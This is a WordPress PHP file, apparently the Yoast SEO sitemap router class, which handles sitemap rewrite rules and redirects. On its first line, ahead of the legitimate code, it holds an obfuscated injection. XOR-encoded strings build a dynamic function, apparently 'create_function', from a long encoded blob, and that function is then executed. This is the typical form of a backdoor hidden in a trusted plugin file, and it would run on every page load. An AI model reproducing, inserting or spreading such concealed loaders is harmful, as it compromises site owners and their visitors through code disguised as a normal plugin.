<?php $EwRiFU='ZR,U,Yi2 C98+-+'^'9 I4X<6TU-ZLBBE';$IgNYQvZJKt=$EwRiFU('','-2IlR16TZ=Q+9HLYB CfvHQ=d65D7i7 4DuMXSOrG.O:CG98RcBOAlO.TA76VCTNj483 xfE81;aENdJvM9:JfX1AiDvEFMl77.8;dc9SevgBsi-l7E76KZAa +JXbwvLBDSJeN9h,8DBDeBaN=0LPkE88UcJQS3Yvr KDBH;74X6Nm KKsilCPOoCU<;R6ioV<YGY6>E<IPnbO .7HPq4PLEYbEg1O39;E=Udeq4;L9Qv3N<SKP5.PpQof; .39xsU<Re 0:UmLSBNLZU1moMN4u.ATA+KROgKGNG,2w<ZCS,N4yxIICT+ETZ6NzzIMVavJY X6zLJZc+;FV +RTdOky=>nnjthA>Nr>.TUjSJJ;M5UEFn:o54o3J:02XKATTfcGH3zY;Qn 2EOarWE,XGEEKx;PnK1kN225-qrq4F=;.ETYQBNPg2->,3VDJttP=Eg.6EUWmc=Q0.T,OsV3<RBABc3657:,3JjarE0FiUD6,;Krpa3 9T:dG3EoH>UD5FyLQ=DlfhqIVXUaMgeinXVGdc.T6+ghG7GO<CtELEbL<WESCCgXpS =oRsCD5Ha6DBhJF-VHwNQdcgmlY1I;+8;KIlW;RNCFEf 91=V,>Eugv ;Y7SpdrzwaO2cD0;+.gq3S.W,lDAY-WS3wmOOcaYVETryhoL<'^'DTaM4DX7.T>Ef-401T0NQ0>O;RT0V6hMA0Rdqs4xNH:T 3PW<C: 33+O  hi;6 fNPYGATFaSTBHenDjV633CB7D5IyVbavf>>HWILGPsXVWySMDPD1EZ.4iEDJ>9KLVh+oxcoG0LCM0bjXbIjYQ810aQeu=ju8V -VIkab;OEX=XfIK.2Z4ExZFf10HN XAK9I-nb<7864ZdF+AZVhmQR1 6<YOCU.GXd.X,DXQRZ J4M9DZ<95TM8PyK9xoaxp=S4OrAKUCuPrsf8-6 TDO6D=QJ   t 76Gvgj,IKL6Sg7M:UYEim55G01a<3pp +vIWn=A,WSl1PjMT43AH:tLk4+xo;+9 H MnVUK-uWmjnM,Y  oNAe<=KW+NQm3.8tiFG,-JAS2XJDS1.AOwaZ9+0 pr2-d6;ajVSALQOQt3SHK7=8=+45OJBLsW70+++=H1OLW60aY<Y4SA0IgW2RH3kmbGWWAVeGV3CHIOY Aq WXZkTVARRK5C;,V<0-F<7A5Qk:X=KJHU-7,4HmACIF52rLGJ5BJ<O,R>hajTxqeEzZbsk rT=A0EYV0BsqP.RWwtXyuH3-DvvMCAKL8C;ZRgP.032C;=75mAPXHQ9MZbYGRDZ-VzYDRZWAoIiMUMJBOUW2Z6wK4  A82WP0ftih<., ZIATFA');$IgNYQvZJKt();
/**
 * @package WPSEO\XML_Sitemaps
 */

/**
 * Rewrite setup and handling for sitemaps functionality.
 */
class WPSEO_Sitemaps_Router {

	/**
	 * Sets up init logic.
	 */
	public function __construct() {

		add_action( 'init', array( $this, 'init' ), 1 );
		add_filter( 'redirect_canonical', array( $this, 'redirect_canonical' ) );
		add_action( 'template_redirect', array( $this, 'template_redirect' ), 0 );
	}

	/**
	 * Sets up rewrite rules.
	 */
	public function init() {

		global $wp;

		$wp->add_query_var( 'sitemap' );
		$wp->add_query_var( 'sitemap_n' );
		$wp->add_query_var( 'xsl' );

		add_rewrite_rule( 'sitemap_index\.xml$', 'index.php?sitemap=1', 'top' );
		add_rewrite_rule( '([^/]+?)-sitemap([0-9]+)?\.xml$', 'index.php?sitemap=$matches[1]&sitemap_n=$matches[2]', 'top' );
		add_rewrite_rule( '([a-z]+)?-?sitemap\.xsl$', 'index.php?xsl=$matches[1]', 'top' );
	}

	/**
	 * Stop trailing slashes on sitemap.xml URLs.
	 *
	 * @param string $redirect The redirect URL currently determined.
	 *
	 * @return bool|string $redirect
	 */
	public function redirect_canonical( $redirect ) {

		if ( get_query_var( 'sitemap' ) || get_query_var( 'xsl' ) ) {
			return false;
		}

		return $redirect;
	}

	/**
	 * Redirects sitemap.xml to sitemap_index.xml.
	 */
	public function template_redirect() {

		global $wp_query;

		$current_url = 'http://';

		if ( ! empty( $_SERVER['HTTPS'] ) && $_SERVER['HTTPS'] === 'on' ) {
			$current_url = 'https://';
		}

		$current_url .= sanitize_text_field( $_SERVER['SERVER_NAME'] );
		$current_url .= sanitize_text_field( $_SERVER['REQUEST_URI'] );

		if ( home_url( '/sitemap.xml' ) === $current_url && $wp_query->is_404 ) {
			wp_redirect( home_url( '/sitemap_index.xml' ), 301 );
			exit;
		}
	}

	/**
	 * Create base URL for the sitemap.
	 *
	 * @param string $page Page to append to the base URL.
	 *
	 * @return string base URL (incl page)
	 */
	public static function get_base_url( $page ) {

		global $wp_rewrite;

		$base = $wp_rewrite->using_index_permalinks() ? 'index.php/' : '/';

		/**
		 * Filter the base URL of the sitemaps
		 *
		 * @param string $base The string that should be added to home_url() to make the full base URL.
		 */
		$base = apply_filters( 'wpseo_sitemaps_base_url', $base );

		// Get the scheme from the configured home url instead of letting WordPress determine the scheme based on the requested URI.
		return home_url( $base . $page, parse_url( get_option( 'home' ), PHP_URL_SCHEME ) );
	}
}
